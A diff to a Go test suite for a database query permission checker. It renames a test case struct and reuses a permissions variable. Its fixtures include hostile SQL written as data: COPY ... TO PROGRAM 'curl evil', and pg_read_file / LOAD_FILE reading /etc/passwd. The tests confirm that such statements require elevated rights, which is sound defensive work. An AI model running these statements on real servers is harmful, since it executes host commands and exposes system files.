@@ -1042,9 +1042,8 @@ func TestPermissions_SelectIntoIsNotJustASelect(t *testing.T) {
 	}
 }
 
-// hostWriteCase is a statement that reaches past the rows into the server
-// itself, and what a role must hold to run it.
-type hostWriteCase struct {
+// dialectSQL is one statement and the dialect it is written in.
+type dialectSQL struct {
 	dialect string
 	sql     string
 }
@@ -1058,7 +1057,7 @@ type hostWriteCase struct {
 func TestPermissions_ReachingTheServerNeedsManage(t *testing.T) {
 	dataActions := dataActionsOnly()
 
-	for _, tt := range []hostWriteCase{
+	for _, tt := range []dialectSQL{
 		// Statement-shaped.
 		{"postgresql", "COPY t1 TO '/tmp/x.csv'"},
 		{"postgresql", "COPY t1 TO PROGRAM 'curl evil'"},
@@ -1103,7 +1102,9 @@ func TestPermissions_ReachingTheServerNeedsManage(t *testing.T) {
 // The name of one of those routines is not the call, so a column or an alias
 // spelled like one is still ordinary work.
 func TestPermissions_AHostFunctionNameIsNotACall(t *testing.T) {
-	for _, tt := range []hostWriteCase{
+	dataActions := dataActionsOnly()
+
+	for _, tt := range []dialectSQL{
 		{"postgresql", "SELECT c1 AS pg_read_file FROM t1"},
 		{"postgresql", "SELECT c1 FROM t1 ORDER BY pg_read_file"},
 		{"mysql", "SELECT c1 AS load_file FROM t1"},
@@ -1116,7 +1117,7 @@ func TestPermissions_AHostFunctionNameIsNotACall(t *testing.T) {
 			if !testutil.Touches(inspected, testutil.Touch{Op: core.InspectOpSelect, Schema: "main", Name: "t1"}) {
 				t.Fatalf("no read of main.t1, so nothing here was checked: %+v", inspected)
 			}
-			if err := core.CheckQueryPermissions(inspected, permDBID, dataActionsOnly()); err != nil {
+			if err := core.CheckQueryPermissions(inspected, permDBID, dataActions); err != nil {
 				t.Errorf("ordinary work refused: %v", err)
 			}
 		})
@@ -1126,7 +1127,9 @@ func TestPermissions_AHostFunctionNameIsNotACall(t *testing.T) {
 // One statement calling such a routine must not drag the rest of a script with
 // it, nor be excused by them.
 func TestPermissions_AScriptIsClassifiedStatementByStatement(t *testing.T) {
-	for _, tt := range []hostWriteCase{
+	dataActions := dataActionsOnly()
+
+	for _, tt := range []dialectSQL{
 		{"postgresql", "SELECT pg_read_file('/etc/passwd'); SELECT c1 FROM t1"},
 		{"mysql", "SELECT LOAD_FILE('/etc/passwd'); SELECT c1 FROM t1"},
 	} {
@@ -1141,7 +1144,7 @@ func TestPermissions_AScriptIsClassifiedStatementByStatement(t *testing.T) {
 			if unknown != 1 {
 				t.Errorf("%d statements need manage, want 1: %+v", unknown, inspected)
 			}
-			if err := core.CheckQueryPermissions(inspected, permDBID, dataActionsOnly()); err == nil {
+			if err := core.CheckQueryPermissions(inspected, permDBID, dataActions); err == nil {
 				t.Error("the calling statement ran on the four row actions")
 			}
 		})
